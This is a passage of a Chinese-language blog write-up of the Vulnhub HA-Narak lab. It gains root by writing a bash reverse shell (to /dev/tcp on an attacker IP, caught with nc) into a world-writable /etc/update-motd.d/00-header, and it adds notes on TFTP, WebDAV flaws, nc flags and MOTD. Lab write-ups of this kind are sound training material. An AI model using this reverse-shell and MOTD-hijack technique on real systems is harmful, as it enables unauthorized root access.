class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br><span class="line"></span><br><span class="line">inferno@ubuntu:~$ </span><br></pre></td></tr></table></figure>

<p>实际上到这已经没思路了，于是翻看了一下大师傅的 WriteUp 视频，发现大师傅是通过 MOTD 来进行提权的<sup><a href="#motd-%E4%BB%8B%E7%BB%8D">④</a></sup>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">inferno@ubuntu:~$ ll /etc/update-motd.d/</span><br><span class="line">total 36</span><br><span class="line">drwxrwxrwx  2 root root 4096 Sep 21  2020 ./                                                                                                                 </span><br><span class="line">drwxr-xr-x 80 root root 4096 Sep 22  2020 ../                                                                                                                </span><br><span class="line">-rwxrwxrwx  1 root root 1220 Apr  9  2018 00-header*</span><br><span class="line">-rwxrwxrwx  1 root root 1157 Apr  9  2018 10-help-text*</span><br><span class="line">-rwxrwxrwx  1 root root 4251 Apr  9  2018 50-motd-news*</span><br><span class="line">-rwxrwxrwx  1 root root  604 Mar 21  2018 80-esm*</span><br><span class="line">-rwxrwxrwx  1 root root 3017 Mar 21  2018 80-livepatch*</span><br><span class="line">-rwxrwxrwx  1 root root  299 May 18  2017 91-release-upgrade*</span><br></pre></td></tr></table></figure>

<p>根据注释，可以知道 MOTD 是动态生成的，所以我们直接进入 <code>/etc/update-motd.d/</code> 目录，在 <code>00-header</code> 文件中添加反弹 shell ：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.118.130/2333 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>

<p>nc 监听，成功反弹：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/BoxWalk/Vulnhub/HA-Narak]</span><br><span class="line">└─$ nc -lvnp 2333 </span><br><span class="line">listening on [any] 2333 ...</span><br><span class="line">connect to [192.168.118.130] from (UNKNOWN) [192.168.118.132] 56488</span><br><span class="line">bash: cannot set terminal process group (11762): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">root@ubuntu:/# cd root</span><br><span class="line">cd root</span><br><span class="line">root@ubuntu:/root# cat ./root.txt</span><br><span class="line">cat ./root.txt</span><br><span class="line">██████████████████████████████████████████████████████████████████████████████████████████</span><br><span class="line">█░░░░░░██████████░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░░░███░░░░░░░░░░░░░░█░░░░░░██░░░░░░░░█</span><br><span class="line">█░░▄▀░░░░░░░░░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀▄▀░░█</span><br><span class="line">█░░▄▀▄▀▄▀▄▀▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░░░▄▀░░███░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░░░█</span><br><span class="line">█░░▄▀░░░░░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░████░░▄▀░░███░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░███</span><br><span class="line">█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░░░▄▀░░███░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░███</span><br><span class="line">█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░███</span><br><span class="line">█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░░░███░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░███</span><br><span class="line">█░░▄▀░░██░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█████░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░███</span><br><span class="line">█░░▄▀░░██░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░░░░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░░░█</span><br><span class="line">█░░▄▀░░██░░░░░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀▄▀░░█</span><br><span class="line">█░░░░░░██████████░░░░░░█░░░░░░██░░░░░░█░░░░░░██░░░░░░░░░░█░░░░░░██░░░░░░█░░░░░░██░░░░░░░░█</span><br><span class="line">██████████████████████████████████████████████████████████████████████████████████████████</span><br><span class="line">                           </span><br><span class="line">                                                                                    </span><br><span class="line">Root Flag: &#123;9440aee508b6215995219c58c8ba4b45&#125;</span><br><span class="line"></span><br><span class="line">!! Congrats you have finished this task !!</span><br><span class="line"></span><br><span class="line">Contact us here:</span><br><span class="line"></span><br><span class="line">Hacking Articles : https://twitter.com/hackinarticles</span><br><span class="line"></span><br><span class="line">Jeenali Kothari  : https://www.linkedin.com/in/jeenali-kothari/</span><br><span class="line"></span><br><span class="line">+-+-+-+-+-+ +-+-+-+-+-+-+-+</span><br><span class="line"> |E|n|j|o|y| |H|A|C|K|I|N|G|</span><br><span class="line"> +-+-+-+-+-+ +-+-+-+-+-+-+-+</span><br><span class="line">__________________________________</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个靶机是作者第一台 Vulnhub 靶机，主要收获如下：</p>
<ol>
<li>熟悉了一个比较完整的渗透流程，特别是信息收集环节的一些思路。比如，怎样端口信息的收集和判断，怎样处理 web 信息以及寻找对应的漏洞；</li>
<li>了解 Webdav 、TFTP 服务的基本知识，至少以后遇到有个初步印象；</li>
<li>了解提权的一些基本手法，通过权限查找所需信息、 motd 提权；</li>
</ol>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1R84y1w7MK/?vd_source=a8f71b037b12c218162155c04e3741e1">「红队笔记」靶机精讲：Narak</a></p>
<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><h3 id="TFTP-获取关键文件"><a href="#TFTP-获取关键文件" class="headerlink" title="TFTP 获取关键文件"></a>TFTP 获取关键文件</h3><p>TFTP 是<strong>简单文件传输协议</strong>（Trivial File Transfer Protocol）的缩写，它是一种用来在客户机和服务器之间进行简单文件传输的协议。它提供不复杂、开销不大的文件传输服务，使用 UDP 协议在端口号69建立网络连接。它的一个主要用途是在局域网中的节点启动时进行文件传输。TFTP 不需要用户登录，也不支持重命名或删除文件。TFTP 通常只适用于局域网使用，因为它没有安全或保密机制。</p>
<p>使用 TFTP 传输文件需要有一个 TFTP 客户端和一个 TFTP 服务器。TFTP 客户端可以用命令行或图形界面的方式操作，TFTP 服务器需要安装和配置相应的软件。不同的操作系统有不同的方法，这里以 Linux 和 Windows 为例。</p>
<p>在 Linux 系统中，可以使用 tftp 命令来传输文件。tftp 命令的语法是：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tftp [主机名称或IP地址]</span><br></pre></td></tr></table></figure>

<p>例如，要连接到远程服务器218.28.188.288，可以输入：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tftp 218.28.188.288</span><br></pre></td></tr></table></figure>

<p>连接成功后，可以使用以下命令来传输文件：</p>
<ul>
<li>put：上传文件到服务器</li>
<li>get：从服务器下载文件</li>
<li>quit：退出tftp</li>
<li>help：显示帮助信息</li>
</ul>
<p>例如，要从服务器下载根目录下的文件README，可以输入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get README</span><br></pre></td></tr></table></figure>

<p>在 Windows 系统中，需要先开启TFTP客户端的功能，方法是：</p>
<ul>
<li>打开控制台，点击应用程序。</li>
<li>在“应用程序与功能”窗口，往下滑到底部点击“程序和功能-&gt;开启与关闭Windows功能”。</li>
<li>在“Windows功能”窗口中，勾选“TFTP客户端”，可能需要重新启动电脑才能完成设置。</li>
</ul>
<p>开启后，可以在命令提示符中输入tftp命令来传输文件。tftp 命令的语法是：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tftp -p -l 本地文件路径 服务器IP地址（上传文件）</span><br><span class="line">tftp -g -r 服务器文件路径 服务器IP地址（下载文件）</span><br></pre></td></tr></table></figure>

<p>例如，要上传本地文件 <code>c:\\User\\Administrator\\Download</code> 到服务器 <code>1.2.3.4</code> ，可以输入：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tftp -p -l c:\\User\\Administrator\\Download 1.2.3.4</span><br></pre></td></tr></table></figure>

<p>要从服务器下载文件data.txt到当前目录，可以输入：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tftp -g -r data.txt 1.2.3.4</span><br></pre></td></tr></table></figure>

<h3 id="Webdav-服务"><a href="#Webdav-服务" class="headerlink" title="Webdav 服务"></a>Webdav 服务</h3><p>Webdav 服务是一种基于 HTTP 协议的文件共享服务，它可以让应用程序直接对 Web 服务器进行读写操作，并支持文件的锁定和版本控制。Webdav 服务的应用场景有：</p>
<ul>
<li>在不同的设备和平台上同步和备份文件，如使用坚果云、 OneDrive 等支持 Webdav 协议的网盘。</li>
<li>在移动端访问和编辑云端的文档、笔记、日程等，如使用 iWork、GoodReader 、Notability 等支持 Webdav 协议的应用。</li>
<li>在远程服务器上管理和传输文件，如使用 RaiDrive 、WinSCP 等支持 Webdav 协议的工具。</li>
</ul>
<p>要使用 Webdav 服务，需要有一个 Webdav 客户端和一个 Webdav 服务器。 Webdav 客户端可以是浏览器、文件管理器、应用程序等，Webdav 服务器可以是网盘、NAS 、VPS 等。要建立连接，需要知道服务器的<strong>地址、端口、用户名和密码</strong>。连接成功后，就可以像操作本地文件一样操作远程文件了。</p>
<p>要搭建一个 Webdav 服务器，可以使用 Windows 自带的 IIS 服务，也可以使用 Apache 、Nginx 等开源软件，或者使用专门的 Webdav 软件。</p>
<p>webdav服务漏洞是指一些利用webdav服务的特性或者缺陷来进行攻击的漏洞。webdav是一种基于HTTP协议的文件管理协议，允许用户通过web服务器来创建、修改、删除和移动文件。webdav服务漏洞的类型和影响有：</p>
<ul>
<li>webdav 目录遍历漏洞：利用 webdav 服务对 URL 解码的不完整性，可以绕过目录限制，访问或者修改任意文件，甚至执行任意代码。</li>
<li>webdav PUT 方法漏洞：利用 webdav 服务支持的 PUT 方法，可以上传任意文件到 web 服务器上，如果没有正确的权限控制和过滤，可能导致任意代码执行或者信息泄露。</li>
<li>webdav PROPFIND 方法漏洞：利用 webdav 服务支持的 PROPFIND 方法，可以获取 web 服务器上的文件和目录信息，如果没有正确的权限控制和过滤，可能导致信息泄露或者拒绝服务。</li>
<li>webdav NTLM 认证绕过漏洞：利用 webdav 服务对 NTLM 认证的不正确处理，可以绕过身份验证，访问或者修改受保护的资源。</li>
</ul>
<h3 id="nc参数含义"><a href="#nc参数含义" class="headerlink" title="nc参数含义"></a>nc参数含义</h3><p>反弹shell中经常回用到netcat这个工具，以下是<code>-lvnp</code>参数的含义：</p>
<p><code>-l</code> ：表示监听模式，使 nc 在指定的端口上监听传入连接。<br><code>-v</code> ：表示详细模式（verbose mode），它会显示更多关于连接的信息，例如连接的来源等。<br><code>-n</code> ：表示禁用主机名解析，这意味着 nc 不会尝试将 IP 地址解析为主机名。<br><code>-p</code> ：后面跟着端口号，表示要监听的端口号。</p>
<h3 id="Brainfuck-加密"><a href="#Brainfuck-加密" class="headerlink" title="Brainfuck 加密"></a>Brainfuck 加密</h3><p>Brainfuck 是一种极简的编程语言，它由一系列简单的指令组成，用于操作一个字节大小的内存单元。由于其简单性，Brainfuck 并不是一个特别适合用于加密的编程语言。然而，你可以使用 Brainfuck 来进行简单的加密操作。</p>
<p>在 Brainfuck 中，你可以编写一段程序来对文本进行加密。加密的基本思想是通过改变字符的 ASCII 值来隐藏原始文本。你可以使用一系列的加减操作来修改字符的 ASCII 值，并将加密后的结果输出。</p>
<p>解密过程是加密过程的逆操作。通过对加密后的文本进行逆向的加减操作，你可以还原出原始的文本。</p>
<p>然而，需要注意的是，Brainfuck加密非常简单，容易被破解。这种加密方式主要用于学习和娱乐目的，而不是用于实际的安全通信。如果你需要更强大和安全的加密算法，请使用专门的加密库或算法，如AES或RSA。</p>
<h3 id="motd-介绍"><a href="#motd-介绍" class="headerlink" title="motd 介绍"></a>motd 介绍</h3><p>在 Linux 中，MOTD（Message of the Day）是指在用户登录系统时显示的一条信息或欢迎消息。 MOTD 通常用于向用户提供系统公告、警告、重要通知或其他相关信息。</p>
<p>MOTD 消息通常存储在一个文件中，可以通过编辑该文件来自定义 MOTD 内容。在大多数 Linux 发行版中， MOTD 文件的位置是 <code>/etc/motd</code> 。在打开的 MOTD 文件中，可以输入自定义的欢迎消息或其他所需的信息。保存并关闭文件后，新的 MOTD 将在下次用户登录时显示。</p>
<p>某些 Linux 发行版可能还有其他方式来管理 MOTD ，例如使用 <code>/etc/update-motd.d/</code> 目录中的脚本来生成 MOTD 。这些脚本可以在每次用户登录时<strong>动态</strong>生成 MOTD 消息。</p>
<p>无论使用哪种方法， MOTD 提供了一种在用户登录系统时向其显示重要信息的方式，以便提供必要的通知和提示。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://peonycsa.com">Peony</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://peonycsa.com/2023/04/18/vulnhub-Narak%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/">https://peonycsa.com/2023/04/18/vulnhub-Narak%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://peonycsa.com" target="_blank">Peony</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/WriteUp/">WriteUp</a><a class="post-meta__tags" href="/tags/vulnhub/">vulnhub</a><a class="post-meta__tags" href="/tags/Narak/">Narak</a></div><div class="post_share"><div class="social-share" data-image="https://pic.imgdb.cn/item/647cc8931ddac507ccbda697.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://fastly.jsdelivr.net/gh/overtrue/share.js@master/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/06/03/vulnhub-w1r3s%E9%80%9A%E5%85%B3/" title="vulnhub-w1r3s通关"><img class="cover" src="https://pic.imgdb.cn/item/647dcd281ddac507ccf5125c.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">vulnhub-w1r3s通关</div></div></a></div><div class="next-post pull-right"><a href="/2023/04/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E7%BB%8F%E4%B8%80%E4%BA%8C%E4%B8%89/" title="渗透测试面经一二三"><img class="cover" src="https://pic.imgdb.cn/item/647dce111ddac507ccf6ce12.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">渗透测试面经一二三</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/10/27/Vulnhub-KioptrixLevel1%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" title="Vulnhub-KioptrixLevel1通关记录"><img class="cover" src="https://pic.imgdb.cn/item/653b2755c458853aef761f44.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-27</div><div class="title">Vulnhub-KioptrixLevel1通关记录</div></div></a></div><div><a href="/2023/06/10/vulnhub-JARBAS%E9%80%9A%E5%85%B3/" title="vulnhub-JARBAS通关"><img class="cover" src="https://pic.imgdb.cn/item/653b2755c458853aef761f44.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-06-10</div><div class="title">vulnhub-JARBAS通关</div></div></a></div><div><a href="/2023/06/03/vulnhub-w1r3s%E9%80%9A%E5%85%B3/" title="vulnhub-w1r3s通关"><img class="cover" src="https://pic.imgdb.cn/item/647dcd281ddac507ccf5125c.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-06-03</div><div class="title">vulnhub-w1r3s通关</div></div></a></div><div><a href="/2023/07/10/HTB-PC%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" title="HTB-PC通关记录"><img class="cover" src="https://pic.imgdb.cn/item/64aaeb061ddac507cc460e7c.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-10</div><div class="title">HTB-PC通关记录</div></div></a></div><div><a href="/2023/09/11/Vulnhub-SICKOSv1-1%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" title="Vulnhub-SICKOSv1.1通关记录"><img class="cover" src="https://pic.imgdb.cn/item/64aae46e1ddac507cc3c4359.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-11</div><div class="title">Vulnhub-SICKOSv1.1通关记录</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://pic.imgdb.cn/item/647c139af024cca1732734de.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Peony</div><div class="author-info__description">知道自己需要的是什么之后，真正的学习才算开始。</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">42</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Catsofsuffering"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Catsofsuffering" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:graywar1@163.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.</span> <span class="toc-text">Nmap扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gobuster-%E7%88%86%E7%A0%B4%E7%9B%AE%E5%BD%95"><span class="toc-number">1.2.</span> <span class="toc-text">gobuster 爆破目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#webdav%E4%B8%8A%E4%BC%A0shell"><span class="toc-number">1.3.</span> <span class="toc-text">webdav上传shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">2.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#find%E5%91%BD%E4%BB%A4%E6%9F%A5%E6%89%BE%E5%8F%AF%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-number">2.1.</span> <span class="toc-text">find命令查找可写文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh%E7%99%BB%E5%BD%95%E6%99%AE%E9%80%9A%E6%9D%83%E9%99%90"><span class="toc-number">2.2.</span> <span class="toc-text">ssh登录普通权限</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="toc-number">4.</span> <span class="toc-text">参考文献</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A"><span class="toc-number">5.</span> <span class="toc-text">注释</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TFTP-%E8%8E%B7%E5%8F%96%E5%85%B3%E9%94%AE%E6%96%87%E4%BB%B6"><span class="toc-number">5.1.</span> <span class="toc-text">TFTP 获取关键文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Webdav-%E6%9C%8D%E5%8A%A1"><span class="toc-number">5.2.</span> <span class="toc-text">Webdav 服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nc%E5%8F%82%E6%95%B0%E5%90%AB%E4%B9%89"><span class="toc-number">5.3.</span> <span class="toc-text">nc参数含义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Brainfuck-%E5%8A%A0%E5%AF%86"><span class="toc-number">5.4.</span> <span class="toc-text">Brainfuck 加密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#motd-%E4%BB%8B%E7%BB%8D"><span class="toc-number">5.5.</span> <span class="toc-text">motd 介绍</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/04/06/phishing-bert/" title="基于BERT模型的钓鱼检测应用"><img src="https://pic1.imgdb.cn/item/67f277450ba3d5a1d7eed922.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="基于BERT模型的钓鱼检测应用"/></a><div class="content"><a class="title" href="/2025/04/06/phishing-bert/" title="基于BERT模型的钓鱼检测应用">基于BERT模型的钓鱼检测应用</a><time datetime="2025-04-06T12:25:29.000Z" title="发表于 2025-04-06 20:25:29">2025-04-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/12/25/CICD%E5%88%9D%E6%8E%A2/" title="CI/CD初探-工具act"><img src="https://pic.imgdb.cn/item/65b76b5d871b83018ab4a506.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CI/CD初探-工具act"/></a><div class="content"><a class="title" href="/2024/12/25/CICD%E5%88%9D%E6%8E%A2/" title="CI/CD初探-工具act">CI/CD初探-工具act</a><time datetime="2024-12-25T09:01:00.000Z" title="发表于 2024-12-25 17:01:00">2024-12-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/10/20/%E4%BB%A3%E7%90%86%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" title="代理相关知识总结"><img src="https://pic.imgdb.cn/item/6714a9f0d29ded1a8c6166d4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="代理相关知识总结"/></a><div class="content"><a class="title" href="/2024/10/20/%E4%BB%A3%E7%90%86%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" title="代理相关知识总结">代理相关知识总结</a><time datetime="2024-10-20T06:51:44.203Z" title="发表于 2024-10-20 14:51:44">2024-10-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/10/13/SQLi%E5%B0%8F%E6%8A%80%E5%B7%A7/" title="SQLi小技巧"><img src="https://pic.imgdb.cn/item/66fe2fc70a206445e3a88ab1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SQLi小技巧"/></a><div class="content"><a class="title" href="/2024/10/13/SQLi%E5%B0%8F%E6%8A%80%E5%B7%A7/" title="SQLi小技巧">SQLi小技巧</a><time datetime="2024-10-13T07:34:35.000Z" title="发表于 2024-10-13 15:34:35">2024-10-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/09/29/localhost%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/" title="localhost绕过方法"><img src="https://pic.imgdb.cn/item/66fe303a0a206445e3a8edf7.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="localhost绕过方法"/></a><div class="content"><a class="title" href="/2024/09/29/localhost%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/" title="localhost绕过方法">localhost绕过方法</a><time datetime="2024-09-29T07:25:13.957Z" title="发表于 2024-09-29 15:25:13">2024-09-29</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://pic.imgdb.cn/item/647cc8931ddac507ccbda697.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By Peony</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><a target="_blank" rel="noopener" href="http://beian.miit.gov.cn"><span>备案号：渝ICP备2025068510号-1 渝公网安备50010702506614号</span></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://fastly.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"></div></div></body></html>